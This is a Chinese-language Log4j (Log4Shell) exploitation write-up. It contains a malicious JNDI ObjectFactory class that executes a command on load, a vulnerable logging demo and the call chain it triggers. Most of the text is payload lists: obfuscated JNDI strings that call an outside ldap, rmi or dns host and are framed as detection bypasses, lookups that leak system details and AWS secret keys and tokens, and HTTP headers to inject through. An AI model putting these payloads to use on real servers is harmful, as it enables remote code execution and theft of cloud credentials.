### 优化后的文本

#### Java代码示例
```java
import javax.naming.spi.ObjectFactory;

public class Calc implements ObjectFactory {
    public Calc() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            // 异常处理
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("calc");
        return null;
    }
}
```
该过程与RMI类似。

### Log4j漏洞分析

#### 漏洞成因
Log4j支持JNDI（Java Naming and Directory Interface），可以远程调用RMI和LDAP。由于RMI和LDAP本身存在安全漏洞，因此Log4j可以通过JNDI间接触发这些漏洞。

#### 示例代码
```java
package com.naihe4;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class J2 {
    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        logger.error("随便输入xxxxxxxxxx231请31212312312：${jndi:rmi://127.0.0.1:1099/hello}");
    }
}
```

#### 调用链
以下是Log4j在处理日志消息时的调用链：
1. `org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:217)`
2. `org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1116)`
3. `org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1038)`
4. `org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)`
5. `org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)`
6. `org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)`
7. `org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)`
8. `org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:345)`
9. `org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)`
10. `org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)`
11. `org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)`
12. `org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)`
13. `org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)`
14. `org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)`
15. `org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)`
16. `org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)`
17. `org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)`
18. `org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)`
19. `org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:543)`
20. `org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:502)`
21. `org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:485)`
22. `org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:460)`
23. `org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63)`
24. `org.apache.logging.log4j.core.Logger.log(Logger.java:161)`
25. `org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2198)`
26. `org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2152)`
27. `org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2135)`
28. `org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2011)`
29. `org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)`
30. `org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:740)`
31. `com.naihe4.J2.main(J2.java:9)`

#### 绕过Payload
以下是一些绕过检测的Payload示例：
- `${jndi:ldap://domain.com/j}`
- `${jndi:ldap:/domain.com/a}`
- `${jndi:dns:/domain.com}`
- `${jndi:dns://domain.com/j}`
- `${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}`
- `${${::-j}ndi:rmi://domain.com/j}`
- `${jndi:rmi://domainldap.com/j}`
- `${${lower:jndi}:${lower:rmi}://domain.com/j}`
- `${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}`
- `${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}`
- `${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}`
- `${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}`
- `${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}`
- `jn${env::-}di:`
- `jn${date:}di${date:':'}`
- `j${k8s:k5:-ND}i${sd:k5:-:}`
- `j${main:\k5:-Nd}i${spring:k5:-:}`
- `j${sys:k5:-nD}${lower:i${web:k5:-:}}`
- `j${::-nD}i${::-:}`
- `j${EnV:K5:-nD}i:`
- `j${loWer:Nd}i${uPper::}`

#### 可执行命令获取信息
以下是一些可用于获取系统信息的命令：
- `${hostName}`
- `${sys:user.name}`
- `${sys:user.home}`
- `${sys:user.dir}`
- `${sys:java.home}`
- `${sys:java.vendor}`
- `${sys:java.version}`
- `${sys:java.vendor.url}`
- `${sys:java.vm.version}`
- `${sys:java.vm.vendor}`
- `${sys:java.vm.name}`
- `${sys:os.name}`
- `${sys:os.arch}`
- `${sys:os.version}`
- `${env:JAVA_VERSION}`
- `${env:AWS_SECRET_ACCESS_KEY}`
- `${env:AWS_SESSION_TOKEN}`
- `${env:AWS_SHARED_CREDENTIALS_FILE}`
- `${env:AWS_WEB_IDENTITY_TOKEN_FILE}`
- `${env:AWS_PROFILE}`
- `${env:AWS_CONFIG_FILE}`
- `${env:AWS_ACCESS_KEY_ID}`

#### Log4j记录的请求头
以下是一些Log4j可能会记录的HTTP请求头：
- `Accept-Charset`
- `Accept-Datetime`
- `Accept-Encoding`
- `Accept-Language`
- `Authorization`
- `Cache-Control`
- `Cf-Connecting-ip`
- `Client-Ip`
- `Contact`
- `Cookie`
- `DNT`
- `Forwarded`
- `Forwarded-For`
- `Forwarded-For-Ip`
- `Forwarded-Proto`
- `From`
- `If-Modified-Since`
- `Max-Forwards`
- `Origin`
- `Originating-Ip`
- `Pragma`
- `Referer`
- `TE`
- `True-Client-IP`
- `True-Client-Ip`
- `Upgrade`
- `User-Agent`
- `Via`
- `Warning`
- `X-ATT-DeviceId`
- `X-Api-Version`
- `X-Att-Deviceid`
- `X-CSRFToken`
- `X-Client-Ip`
- `X-Correlation-ID`
- `X-Csrf-Token`
- `X-Do-Not-Track`
- `X-Foo`
- `X-Foo-Bar`
- `X-Forward-For`
- `X-Forward-Proto`
- `X-Forwarded`
- `X-Forwarded-By`
- `X-Forwarded-For`
- `X-Forwarded-For-Original`
- `X-Forwarded-Host`
- `X-Forwarded-Port`
- `X-Forwarded-Proto`
- `X-Forwarded-Protocol`
- `X-Forwarded-Scheme`
- `X-Forwarded-Server`
- `X-Forwarded-Ssl`
- `X-Forwarder-For`
- `X-Frame-Options`
- `X-From`
- `X-Geoip-Country`
- `X-HTTP-Method-Override`
- `X-Http-Destinationurl`
- `X-Http-Host-Override`
- `X-Http-Method`
- `X-Http-Method-Override`
- `X-Http-Path-Override`
- `X-Https`
- `X-Htx-Agent`
- `X-Hub-Signature`
- `X-If-Unmodified-Since`
- `X-Imbo-Test-Config`
- `X-Insight`
- `X-Ip`
- `X-Ip-Trail`
- `X-Leakix`
- `X-Originating-Ip`
- `X-ProxyUser-Ip`
- `X-Real-Ip`
- `X-Remote-Addr`
- `X-Remote-Ip`
- `X-Request-ID`
- `X-Requested-With`
- `X-UIDH`
- `X-Wap-Profile`
- `X-XSRF-TOKEN`
- `Authorization: Basic`
- `Authorization: Bearer`
- `Authorization: Oauth`
- `Authorization: Token`